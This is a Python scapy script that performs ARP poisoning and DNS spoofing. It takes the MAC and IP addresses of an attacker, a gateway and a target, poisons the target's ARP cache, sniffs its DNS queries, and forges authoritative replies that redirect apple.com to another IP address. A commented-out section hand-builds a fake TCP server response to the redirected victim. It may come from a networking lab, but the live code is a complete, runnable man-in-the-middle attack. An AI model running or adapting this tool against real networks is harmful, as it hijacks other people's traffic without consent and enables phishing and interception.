import logging
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP, TCP
from scapy.layers.l2 import Ether
from scapy.all import DNSRR, Packet, IP, sendp
from Spoofer import Spoofer
from Sniffer import Sniffer
import argparse

args = None
youtube_ip = "142.251.40.206"


def create_reroute_dns_query_fn(domain: str, new_ip: str, interface: str):
    def on_dns_packet(packet: Packet) -> None:
        if packet[DNS].qd and packet[DNS].qd.qname == domain:
            logging.info(f"rerouting {domain} to {new_ip}")
            # Construct the DNS packet
            # Construct the Ethernet header by looking at the sniffed packet
            eth = Ether(src=packet[Ether].dst, dst=packet[Ether].src)

            # Construct the IP header by looking at the sniffed packet
            ip = IP(src=packet[IP].dst, dst=packet[IP].src)

            # Construct the UDP header by looking at the sniffed packet
            udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)

            # Construct the DNS response by looking at the sniffed packet and manually
            dns = DNS(
                id=packet[DNS].id,
                qd=packet[DNS].qd,
                aa=1,
                rd=0,
                qr=1,
                qdcount=1,
                ancount=1,
                nscount=0,
                arcount=0,
                ar=DNSRR(
                    rrname=packet[DNS].qd.qname,
                    type="A",
                    ttl=600,
                    rdata=new_ip,
                ),
            )

            # Put the full packet together
            response_packet = eth / ip / udp / dns

            # Send the DNS response
            sendp(response_packet, iface=interface)
    return on_dns_packet

def main() -> None:
    logging.basicConfig(level=logging.INFO)
    parser = argparse.ArgumentParser()
    parser.add_argument("--interface", type=str)
    parser.add_argument("--attacker_mac", type=str)
    parser.add_argument("--gateway_mac", type=str)
    parser.add_argument("--target_mac", type=str)
    parser.add_argument("--gateway_ip", type=str)
    parser.add_argument("--target_ip", type=str)
    parser.add_argument("--interval", type=float, default=0.5)
    parser.add_argument("--verbose", type=bool, default=True)
    args = parser.parse_args()

    reroute_apple_to_youtube = create_reroute_dns_query_fn("apple.com",youtube_ip,args.interface)
    show_packet = lambda p: p.show()


    sniffer = Sniffer(interface=args.interface)
    spoofer = Spoofer(
        interface=args.interface,
        attacker_mac=args.attacker_mac,
        gateway_mac=args.gateway_mac,
        target_mac=args.target_mac,
        gateway_ip=args.gateway_ip,
        target_ip=args.target_ip,
        interval=args.interval,
        verbose=args.verbose,
    )
    
    sniffer.add_packet_handler(DNS, reroute_apple_to_youtube)
    spoofer.start_poisoning()
    sniffer.start()
    spoofer.stop_poisoning()


if __name__ == "__main__":
    main()



# def on_http_packet(p: Packet) -> None:
#     global http_server_state

#     logging.info(p.summary())
#     # assert p[IP].dst == DEFAULT_DNS_RESOLUTION
#     # assert p[IP].src == DEFAULT_TARGET_IP_ADDR
#     # assert p[TCP].dport == 1200

#     logging.info(f"handling HTTP request")

#     if http_server_state == TCPServerState.LISTEN:
#         if p[TCP].flags == "S":
#             eth = Ether(src=p[Ether].dst, dst=p[Ether].src)

#             ip = IP(src=p[IP].dst, dst=p[IP].src)

#             tcp = TCP(
#                 flags="SA",
#                 sport=p[TCP].dport,
#                 dport=p[TCP].sport,
#                 seq=INITIAL_SEQ,
#                 ack=p[TCP].seq + 1,
#             )

#             r = eth / ip / tcp
#             logging.info("SENDING SYN-ACK:")
#             r.show()
#             sendp(r, iface=INTERFACE)
#             http_server_state = TCPServerState.SYN_RECEIVED
#         else:
#             logging.error(f"unexpected packet: {p.summary()}")

#     elif http_server_state == TCPServerState.SYN_RECEIVED:
#         if p[TCP].flags == "A":
#             logging.info("received ack")
#             http_server_state = TCPServerState.ESTABLISHED
#         else:
#             logging.error(f"unexpected packet: {p.summary()}")

#     elif http_server_state == TCPServerState.ESTABLISHED:
#         logging.info("WE ESTABLISHED")
#         if p[TCP].flags == "PA":
#             eth = Ether(src=p[Ether].dst, dst=p[Ether].src)

#             ip = IP(src=p[IP].dst, dst=p[IP].src)

#             payload = json.dumps({"secret": "test"})

#             tcp = TCP(
#                 flags="PA",
#                 sport=p[TCP].dport,
#                 dport=p[TCP].sport,
#                 seq=INITIAL_SEQ + len(payload),
#                 ack=p[TCP].seq,
#             )

#             raw = Raw(load=payload)

#             r = eth / ip / tcp / raw
#             logging.info("SENDING PAY-ACK:")
#             r.show()
#             sendp(r, iface=INTERFACE)
#             http_server_state = TCPServerState.FIN_WAIT_1
#         pass

